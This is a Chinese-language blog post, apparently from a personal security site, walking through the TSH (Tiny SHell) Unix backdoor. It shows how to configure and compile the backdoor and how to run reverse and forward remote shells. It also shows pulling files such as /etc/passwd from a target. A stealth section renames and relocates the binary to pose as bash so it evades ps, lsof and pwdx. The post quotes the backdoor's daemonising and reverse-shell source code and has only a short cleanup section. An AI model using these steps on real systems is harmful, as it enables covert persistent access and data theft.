@@ -1,0 +1,369 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="渗透测试,工具,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>Unix后门Tiny SHell工具浅析 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Unix后门Tiny SHell工具浅析
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-09-27T02:06:08.000Z">
+        2021-09-27
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-TSH简介"><a href="#0x00-TSH简介" class="headerlink" title="0x00 TSH简介"></a>0x00 TSH简介</h2><p>Tiny SHell即TSH是Orange于8年前开发的一款开源的UNIX后门工具，由C编写，体积Tiny。</p>
+<p>支持功能：</p>
+<ul>
+<li>正向/反向连接模式；</li>
+<li>文件传输；</li>
+<li>加密通信；</li>
+</ul>
+<p>地址：<a href="https://github.com/orangetw/tsh" target="_blank" rel="noopener">https://github.com/orangetw/tsh</a></p>
+<h2 id="0x01-工具使用"><a href="#0x01-工具使用" class="headerlink" title="0x01 工具使用"></a>0x01 工具使用</h2><p>下载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/orangetw/tsh.git</span><br></pre></td></tr></table></figure>
+<p>修改tsh.h文件，主要修改密钥和控制端地址（如果使用反向连接）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">"replace with your password"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 7586</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAKE_PROC_NAME <span class="meta-string">"/bin/bash"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_HOST  <span class="meta-string">"localhost"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_DELAY 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure>
+<p>参数说明：</p>
+<ul>
+<li>secret：用于加密控制端和被控端之间通信的数据，这里所有通信都经过AES加密处理，密钥的长度任意（最好大于12，更安全）；</li>
+<li>SERVER_PORT：服务端监听端口号；</li>
+<li>FAKE_PROC_NAME：用于伪装显示后门运行后的进程名字（用<code>ps -ef</code>或者<code>netstat</code>查看显示的进程名字）；</li>
+<li>CONNECT_BACK_HOST：控制端地址；</li>
+<li>CONNECT_BACK_DELAY：连接延时，默认延时单位为秒；</li>
+</ul>
+<p>编译，参数从<code>linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf</code>中选择，我本地环境为linux：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make linux</span><br></pre></td></tr></table></figure>
+<p>编译完成后，在当前目录中会生成tsh和tshd两个文件。</p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>前提准备是在编译前将tsh.h文件中的CONNECT_BACK_HOST设置为反向连接的控制端地址后再进行编译操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_HOST  <span class="meta-string">"控制端地址"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_DELAY 30</span></span><br></pre></td></tr></table></figure>
+<p>在控制端运行tsh程序开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tsh</span><br><span class="line">./tsh cb</span><br></pre></td></tr></table></figure>
+<p>在被控制端运行tshd即可定时反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tshd</span><br><span class="line">./tshd</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/1.png" alt=""></p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在编译前注释掉tsh.h文件中关于反向连接的两个设置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#define CONNECT_BACK_HOST  "控制端地址"</span></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_DELAY 30</span></span><br></pre></td></tr></table></figure>
+<p>先在被控制端运行tshd：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tshd</span><br><span class="line">./tshd</span><br></pre></td></tr></table></figure>
+<p>然后在控制端运行tsh程序发起正向连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tsh</span><br><span class="line">./tsh 被控制端IP</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/3.png" alt=""></p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>正向连接下载文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 被控制端IP get /etc/passwd ./</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/10.png" alt=""></p>
+<p>上传文件改为put即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 被控制端IP put aaa.sh /tmp</span><br></pre></td></tr></table></figure>
+<h3 id="简单隐蔽"><a href="#简单隐蔽" class="headerlink" title="简单隐蔽"></a>简单隐蔽</h3><p>前面的默认操作隐蔽性弱、容易被用户发现，比如不修改程序名直接运行的话通过lsof命令还是能看到原程序名的：</p>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/4.png" alt=""></p>
+<p>修改下名称：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv tshd bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/5.png" alt=""></p>
+<p>看到还是有个缺点，就是通过pwdx命令查看程序所在路径会有所暴露，因此可以进一步移动到可执行程序常在的目录中伪装，一般系统的bash位于<code>/bin/bash</code>或<code>/usr/bin/bash</code>，笔者的环境<code>/usr/bin</code>下没有bash就放到这里了，其他如<code>/usr/sbin</code>目录也可以：</p>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/6.png" alt=""></p>
+<p>但是遇到个问题，放到目录下无法正常正向连接。参考<a href="https://cloud.tencent.com/developer/article/1047029" target="_blank" rel="noopener">这篇文章</a>说的，在tsh.c中看到是执行<code>bash --login</code>命令的，但是该bash程序并没有指定执行的路径，依靠目标环境变量PATH的值设置的路径来逐个寻找：</p>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/7.png" alt=""></p>
+<p>而测试的目标主机PATH环境变量为<code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code>，即<code>/usr/bin</code>在正常bash目录<code>/bin</code>的前面，导致没有执行到正常的bash。因此修改下其中的bash为绝对路径的bash即可：</p>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/8.png" alt=""></p>
+<p>重新编译上传运行，就OK了：</p>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/9.png" alt=""></p>
+<p>看到<code>ps -ef</code>命令的结果，其中<code>-bash</code>是正常的bash进程，而12611和12613都是后门守护进程、其伪装成<code>/bin/bash</code>，12614为后门守护进程执行系统命令<code>exec /bin/bash --login</code>反弹的shell进程。</p>
+<p>除此之外，连接的端口号也需要改为常用的端口以便于隐藏。</p>
+<h2 id="0x02-后门清理"><a href="#0x02-后门清理" class="headerlink" title="0x02 后门清理"></a>0x02 后门清理</h2><p>以反连为例，查看异常bash连接端口、进程ID等，如果攻击者没有修改程序名且没有魔改直接编译使用的话，可以通过对比看<code>/proc/pid/comm</code>的真实进程名来查杀即可：</p>
+<p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/2.png" alt=""></p>
+<p>正连类似的，用lsof命令也能直接分析出来。</p>
+<p>至于修改程序名或魔改后的后门程序，可自行根据实际情况分析，这里没有细究。</p>
+<h2 id="0x03-原理浅析"><a href="#0x03-原理浅析" class="headerlink" title="0x03 原理浅析"></a>0x03 原理浅析</h2><p>tsh代码简洁，这里仅看看它服务端即tshd的关键部分。</p>
+<p>执行后门tshd后，先是重写cmdline为用户设置的伪装进程名（默认为<code>/bin/bash</code>），然后主进程会fork一个子进程1，父进程退出，该子进程1则成为孤儿进程被init托管：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* overwrite cmdline */</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span> *)argv[<span class="number">0</span>], <span class="string">'\0'</span>, <span class="built_in">strlen</span>(argv[<span class="number">0</span>]));</span><br><span class="line"><span class="built_in">strcpy</span>(argv[<span class="number">0</span>], FAKE_PROC_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fork into background */</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">0</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在后面的循环处理中，当子进程1成功连接上控制端监听的端口之后，会又fork一个子进程2用于处理建立好的连接，而该子进程2的父进程即子进程1会等待子进程2执行完再继续往下执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fork a child to handle the connection */</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    close( client );</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    waitpid( pid, <span class="literal">NULL</span>, <span class="number">0</span> );</span><br><span class="line">    close( client );</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>子进程2接着会fork一个子进程3，然后子进程2退出，从而使得子进程3脱离了其祖父进程即子进程1成为孤儿进程、被init托管、成为守护进程，子进程3中开始真正进行交互shell/文件传输操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the child forks and then exits so that the grand-child's</span></span><br><span class="line"><span class="comment"> * father becomes init (this to avoid becoming a zombie) */</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">8</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">9</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* setup the packet encryption layer */</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* get the action requested by the client */</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* howdy */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>( message[<span class="number">0</span>] )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> GET_FILE:</span><br><span class="line"></span><br><span class="line">        ret = tshd_get_file( client );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PUT_FILE:</span><br><span class="line"></span><br><span class="line">        ret = tshd_put_file( client );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> RUNSHELL:</span><br><span class="line"></span><br><span class="line">        ret = tshd_runshell( client );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        </span><br><span class="line">        ret = <span class="number">12</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shutdown( client, <span class="number">2</span> );</span><br><span class="line"><span class="keyword">return</span>( ret );</span><br></pre></td></tr></table></figure>
+<p>而在后面调用tshd_runshell()函数中，其中会再次fork子进程4来专门进行新建会话来反弹shell，而子进程4的父进程即子进程3则进行信息的接受和发送：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* fork to spawn a shell */</span></span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>( <span class="number">43</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pid == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* close the client socket and the pty (master side) */</span></span><br><span class="line">        close( client );</span><br><span class="line">        close( pty );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* create a new session */</span></span><br><span class="line">        <span class="keyword">if</span>( setsid() &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>( <span class="number">44</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* set controlling tty, to have job control */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF</span></span><br><span class="line">        <span class="keyword">if</span>( ioctl( tty, TIOCSCTTY, <span class="literal">NULL</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>( <span class="number">45</span> );</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> fd;</span><br><span class="line">            fd = open( slave, O_RDWR );</span><br><span class="line">            <span class="keyword">if</span>( fd &lt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>( <span class="number">46</span> );</span><br><span class="line">            &#125;</span><br><span class="line">            close( tty );</span><br><span class="line">            tty = fd;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* tty becomes stdin, stdout, stderr */</span></span><br><span class="line">        dup2( tty, <span class="number">0</span> );</span><br><span class="line">        dup2( tty, <span class="number">1</span> );</span><br><span class="line">        dup2( tty, <span class="number">2</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( tty &gt; <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            close( tty );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* fire up the shell */</span></span><br><span class="line">        shell = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>( <span class="number">8</span> );</span><br><span class="line">        <span class="keyword">if</span>( shell == <span class="literal">NULL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>( <span class="number">47</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        shell[<span class="number">0</span>] = <span class="string">'/'</span>; shell[<span class="number">4</span>] = <span class="string">'/'</span>;</span><br><span class="line">        shell[<span class="number">1</span>] = <span class="string">'b'</span>; shell[<span class="number">5</span>] = <span class="string">'s'</span>;</span><br><span class="line">        shell[<span class="number">2</span>] = <span class="string">'i'</span>; shell[<span class="number">6</span>] = <span class="string">'h'</span>;</span><br><span class="line">        shell[<span class="number">3</span>] = <span class="string">'n'</span>; shell[<span class="number">7</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        execl( shell, shell + <span class="number">5</span>, <span class="string">"-c"</span>, temp, (<span class="keyword">char</span> *) <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* d0h, this shouldn't happen */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>( <span class="number">48</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* tty (slave side) not needed anymore */</span></span><br><span class="line">        close( tty );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* let's forward the data back and forth */</span></span><br><span class="line">        <span class="keyword">while</span>( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            FD_ZERO( &amp;rd );</span><br><span class="line">            FD_SET( client, &amp;rd );</span><br><span class="line">            FD_SET( pty, &amp;rd );</span><br><span class="line">            n = ( pty &gt; client ) ? pty : client;</span><br><span class="line">            <span class="keyword">if</span>( select( n + <span class="number">1</span>, &amp;rd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>( <span class="number">49</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( FD_ISSET( client, &amp;rd ) )</span><br><span class="line">            &#123;</span><br><span class="line">                ret = pel_recv_msg( client, message, &amp;len );</span><br><span class="line">                <span class="keyword">if</span>( ret != PEL_SUCCESS )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">50</span> );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( write( pty, message, len ) != len )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">51</span> );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( FD_ISSET( pty, &amp;rd ) )</span><br><span class="line">            &#123;</span><br><span class="line">                len = read( pty, message, BUFSIZE );</span><br><span class="line">                <span class="keyword">if</span>( len == <span class="number">0</span> ) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>( len &lt; <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">52</span> );</span><br><span class="line">                &#125;</span><br><span class="line">                ret = pel_send_msg( client, message, len );</span><br><span class="line">                <span class="keyword">if</span>( ret != PEL_SUCCESS )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">53</span> );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>( <span class="number">54</span> );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>小结下来，大致如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">father -&gt; X</span><br><span class="line">       -&gt; child1</span><br><span class="line">             |</span><br><span class="line">          ----</span><br><span class="line">          |</span><br><span class="line">init -&gt; child1 -&gt; # waitpid(child2)</span><br><span class="line">               -&gt; child2 -&gt; X</span><br><span class="line">                         -&gt; child3</span><br><span class="line">                              |</span><br><span class="line">          ---------------------</span><br><span class="line">          |</span><br><span class="line">init -&gt; child3 -&gt; # send &amp; receive message</span><br><span class="line">               -&gt; child4 # reverse shell</span><br></pre></td></tr></table></figure>
+<p>当然，可以自行魔改实现更高的隐蔽性和更强的免杀。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://cloud.tencent.com/developer/article/1047029" target="_blank" rel="noopener">短小精干的Unix类后门Tiny shell的使用与分析</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-TSH简介"><span class="toc-text">0x00 TSH简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-工具使用"><span class="toc-text">0x01 工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反向连接"><span class="toc-text">反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正向连接"><span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件传输"><span class="toc-text">文件传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单隐蔽"><span class="toc-text">简单隐蔽</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-后门清理"><span class="toc-text">0x02 后门清理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-原理浅析"><span class="toc-text">0x03 原理浅析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
